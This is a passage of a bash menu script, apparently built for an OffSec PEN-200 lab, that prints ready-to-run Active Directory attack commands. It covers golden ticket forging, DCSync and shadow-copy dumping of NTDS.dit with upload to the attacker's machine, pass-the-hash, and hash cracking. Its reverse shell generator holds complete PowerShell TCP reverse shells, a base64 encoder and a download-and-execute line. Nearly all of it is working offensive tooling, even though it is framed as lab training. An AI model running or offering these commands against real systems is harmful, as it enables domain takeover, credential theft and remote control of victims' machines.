            step "5. Purge old tickets:"
            mimi "kerberos::purge"
            div
            step "6. Forge golden ticket:"
            mimi "kerberos::golden /user:${USERNAME} /domain:${DOMAIN} /sid:${sid} /krbtgt:${krbtgt} /ptt"
            div
            step "7. Open CMD and move to DC:"
            mimi "misc::cmd"
            win "PsExec.exe \\\\DC1 cmd.exe"
            win "whoami /groups"
            note "Answer to lab Q: krbtgt user's NTLM hash"
            ;;
        0) return ;;
        esac; pause
    done
}

# ══════════════════════════════════════════════════════════════════
#  TECHNIQUE 9 — SHADOW COPY (Persistence)
# ══════════════════════════════════════════════════════════════════
menu_shadow() {
    while true; do
        banner; sec "Shadow Copy — Credential Extraction Persistence"
        info "Dump NTDS.dit via VSS shadow copy → extract ALL domain hashes"
        info "Requires: Domain Admin on DC"
        echo ""
        echo -e "  ${W}1)${NC} Create shadow copy on DC"
        echo -e "  ${W}2)${NC} Extract NTDS.dit + SYSTEM hive"
        echo -e "  ${W}3)${NC} Transfer files to Kali"
        echo -e "  ${W}4)${NC} secretsdump offline (Kali)"
        echo -e "  ${W}5)${NC} DCSync (no files needed)"
        echo -e "  ${W}6)${NC} Full walkthrough"
        echo -e "  ${W}0)${NC} Back"
        echo ""; ask "Choice" c
        case $c in
        1)  sec "Create Shadow Copy"
            note "Run on DC as Domain Admin (elevated CMD):"
            win "vshadow.exe -nw -p C:"
            note "Note the 'Shadow copy device name' from output"
            note "Format: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2"
            ;;
        2)  sec "Extract NTDS.dit + SYSTEM"
            note "Replace shadow copy path with actual output from vshadow:"
            win "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\ntds\\ntds.dit c:\\ntds.dit.bak"
            win "reg.exe save hklm\\system c:\\system.bak"
            note "Both files saved to C:\\"
            ;;
        3)  sec "Transfer Files to Kali"
            step "Option A — SMB server on Kali:"
            kali "impacket-smbserver share . -smb2support"
            win "copy c:\\ntds.dit.bak \\\\${KALI_IP}\\share\\"
            win "copy c:\\system.bak \\\\${KALI_IP}\\share\\"
            div
            step "Option B — Python HTTP:"
            win "powershell -c \"(New-Object Net.WebClient).UploadFile('http://${KALI_IP}:8000/ntds.dit.bak','c:\\ntds.dit.bak')\""
            ;;
        4)  sec "secretsdump Offline (Kali)"
            kali "impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL"
            note "Dumps ALL domain accounts: users, computers, krbtgt, etc."
            note "Format: username:RID:LMhash:NThash:::"
            note "Use NT hashes for PTH, crack with hashcat mode 1000"
            ;;
        5)  sec "DCSync — No Files Needed"
            note "Mimikatz DCSync on pivot machine (need DA):"
            mimi "privilege::debug"
            mimi "lsadump::dcsync /user:krbtgt"
            mimi "lsadump::dcsync /user:Administrator"
            mimi "lsadump::dcsync /domain:${DOMAIN} /all /csv"
            div
            step "Impacket secretsdump (network, Kali):"
            kali "impacket-secretsdump ${DOMAIN}/Administrator:'${PASSWORD}'@${TARGET_IP}"
            note "Faster and leaves no files on disk"
            ;;
        6)  sec "Full Shadow Copy Walkthrough"
            step "1. RDP to DC as DA user (jeffadmin)"
            step "2. Create shadow copy:"
            win "vshadow.exe -nw -p C:"
            div
            step "3. Copy database + registry:"
            win "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\ntds\\ntds.dit c:\\ntds.dit.bak"
            win "reg.exe save hklm\\system c:\\system.bak"
            div
            step "4. Transfer to Kali, then extract:"
            kali "impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL"
            div
            step "5. Crack or reuse hashes:"
            kali "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt"
            kali "impacket-wmiexec -hashes :2892d26cdf84d7a70e2eb3b9f05c425e Administrator@${TARGET_IP}"
            ;;
        0) return ;;
        esac; pause
    done
}

# ══════════════════════════════════════════════════════════════════
#  RECON & CHECKLIST
# ══════════════════════════════════════════════════════════════════
menu_recon() {
    banner; sec "Recon + Pre-Attack Checklist"

    step "1. Verify connectivity:"
    kali "ping -c 1 ${TARGET_IP}"
    kali "nmap -p 135,139,445,3389,5985,5986 --open -T4 ${TARGET_IP}"
    div

    step "2. Validate credentials:"
    kali "cme smb ${TARGET_IP} -u ${USERNAME} -p '${PASSWORD}' -d ${DOMAIN}"
    note "[+] means valid creds | [Pwn3d!] means local admin"
    div

    step "3. Port → best attack method:"
    echo -e "  ${C}135${NC}    → WMI (wmiexec, CimSession)"
    echo -e "  ${C}445${NC}    → PsExec, smbexec, PTH, secretsdump"
    echo -e "  ${C}5985${NC}   → WinRM, WinRS, Evil-WinRM, PSSession"
    echo -e "  ${C}5986${NC}   → WinRM over HTTPS"
    echo -e "  ${C}3389${NC}   → RDP (need RDP group or DA)"
    div

    step "4. Common flag locations:"
    win "type C:\\Users\\Administrator\\Desktop\\flag.txt"
    win "type C:\\Users\\Administrator\\Desktop\\proof.txt"
    win "type C:\\Users\\jen\\Desktop\\flag.txt"
    ps  "Get-ChildItem C:\\Users -Recurse -Filter flag.txt -ErrorAction SilentlyContinue"
    div

    step "5. Quick recon once you have a shell:"
    win "whoami & hostname & ipconfig /all"
    win "net user & net localgroup administrators"
    win "net group \"Domain Admins\" /domain"
    ps  "Get-ADUser -Filter * | Select SamAccountName"

    pause
}

# ══════════════════════════════════════════════════════════════════
#  REVSHELL GENERATOR STANDALONE
# ══════════════════════════════════════════════════════════════════
menu_revshell() {
    while true; do
        banner; sec "Reverse Shell Generator"
        echo ""
        echo -e "  ${W}1)${NC} PowerShell TCP (base64) — best for WMI/DCOM/WinRS"
        echo -e "  ${W}2)${NC} PowerShell raw one-liner"
        echo -e "  ${W}3)${NC} Nishang one-liner"
        echo -e "  ${W}4)${NC} Save encode.py to disk"
        echo -e "  ${W}5)${NC} msfvenom payload"
        echo -e "  ${W}0)${NC} Back"
        echo ""; ask "Choice" c
        case $c in
        1)  gen_revshell
            sec "PowerShell Base64 Reverse Shell"
            show_listener
            kali "# command to run on target:"
            echo "  ${BOLD}${REVSHELL_CMD}${NC}"
            ;;
        2)  sec "Raw One-Liner"
            show_listener
            echo "  ${BOLD}powershell -nop -c \"\$c=New-Object Net.Sockets.TCPClient('${KALI_IP}',${LPORT});\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){iex ([Text.Encoding]::ASCII.GetString(\$b,0,\$i))}\"${NC}"
            ;;
        3)  sec "Nishang Invoke-PowerShellTcp"
            show_listener
            kali "cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 /tmp/shell.ps1"
            kali "echo 'Invoke-PowerShellTcp -Reverse -IPAddress ${KALI_IP} -Port ${LPORT}' >> /tmp/shell.ps1"
            kali "python3 -m http.server 80"
            div
            win "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://${KALI_IP}/shell.ps1')\""
            ;;
        4)  sec "encode.py"
            cat > /tmp/encode.py << PYEOF
import base64
ip   = "${KALI_IP}"
port = ${LPORT}

payload = f'\$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{{0}};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){{;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + "PS " + (pwd).Path + "> ";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()}};\$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf-16-le')).decode()
print(cmd)
PYEOF
            ok "Saved to /tmp/encode.py"
            kali "python3 /tmp/encode.py"
            ;;
        5)  sec "msfvenom"
            kali "msfvenom -p windows/x64/shell_reverse_tcp LHOST=${KALI_IP} LPORT=${LPORT} -f exe -o /tmp/shell.exe"
            kali "msfvenom -p windows/x64/powershell_reverse_tcp LHOST=${KALI_IP} LPORT=${LPORT} -f ps1 -o /tmp/shell.ps1"
            div
            show_listener
            ;;
        0) return ;;
        esac; pause
    done
}

# ══════════════════════════════════════════════════════════════════
#  HASHCAT
# ══════════════════════════════════════════════════════════════════
menu_crack() {
    banner; sec "Hash Cracking — Hashcat Reference"
    step "NTLM (most common from secretsdump/mimikatz):"
    kali "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt"
    kali "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --rules /usr/share/hashcat/rules/best64.rule"
    div
    step "NetNTLMv2 (from Responder):"
    kali "hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt"
    div
    step "Kerberoast TGS:"
    kali "hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt"
    div
    step "AS-REP Roast:"
    kali "hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt"
    div
    step "Identify hash type:"
    kali "hashid '<HASH>'"
    kali "haiti '<HASH>'"
    pause
}

# ══════════════════════════════════════════════════════════════════
#  MAIN MENU
# ══════════════════════════════════════════════════════════════════
main_menu() {
    while true; do
        banner
        echo -e "  ${W}${BOLD}━━━ LATERAL MOVEMENT ━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "  ${W}1)${NC}  🔧  WMI             ${DIM}(port 135, local admin)${NC}"
        echo -e "  ${W}2)${NC}  🌐  WinRM / WinRS   ${DIM}(port 5985/5986)${NC}"
        echo -e "  ${W}3)${NC}  📦  PsExec / SMB    ${DIM}(port 445)${NC}"
        echo -e "  ${W}4)${NC}  🔑  Pass-the-Hash   ${DIM}(NTLM hash → auth)${NC}"
        echo -e "  ${W}5)${NC}  ⬆️   Overpass-Hash   ${DIM}(NTLM hash → Kerberos TGT)${NC}"
        echo -e "  ${W}6)${NC}  🎫  Pass-the-Ticket ${DIM}(steal + inject TGS)${NC}"
        echo -e "  ${W}7)${NC}  🧩  DCOM            ${DIM}(MMC20.Application)${NC}"
        echo ""
        echo -e "  ${W}${BOLD}━━━ PERSISTENCE ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "  ${W}8)${NC}  🏆  Golden Ticket   ${DIM}(krbtgt hash → forge any TGT)${NC}"
        echo -e "  ${W}9)${NC}  👥  Shadow Copy     ${DIM}(dump ALL hashes via VSS)${NC}"
        echo ""
        echo -e "  ${W}${BOLD}━━━ UTILITIES ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "  ${W}r)${NC}  🔍  Recon + Checklist"
        echo -e "  ${W}s)${NC}  🐚  Reverse Shell Generator"
        echo -e "  ${W}c)${NC}  💥  Hash Cracking Reference"
        echo -e "  ${W}u)${NC}  ✏️   Update Target Info"
        echo -e "  ${W}0)${NC}  ❌  Exit"
        echo ""
        ask "Choice" c
        case $c in
        1) menu_wmi    ;;  2) menu_winrm  ;;  3) menu_psexec ;;
        4) menu_pth    ;;  5) menu_opth   ;;  6) menu_ptt    ;;
        7) menu_dcom   ;;  8) menu_golden ;;  9) menu_shadow ;;
        r) menu_recon  ;;  s) menu_revshell ;; c) menu_crack ;;
        u) update_info ;;
        0) echo -e "\n${LG}Done. Good luck!${NC}\n"; exit 0 ;;
        *) warn "Invalid choice" ;;
        esac
    done
}

# ══════════════════════════════════════════════════════════════════
banner
echo -e "  ${LG}This tool generates ready-to-run commands for ALL techniques${NC}"
echo -e "  ${LG}covered in OffSec PEN-200 AD Lateral Movement module.${NC}"
echo -e "  ${DIM}  Fill in your lab info once → all commands auto-populated.${NC}\n"
collect_info
main_menu
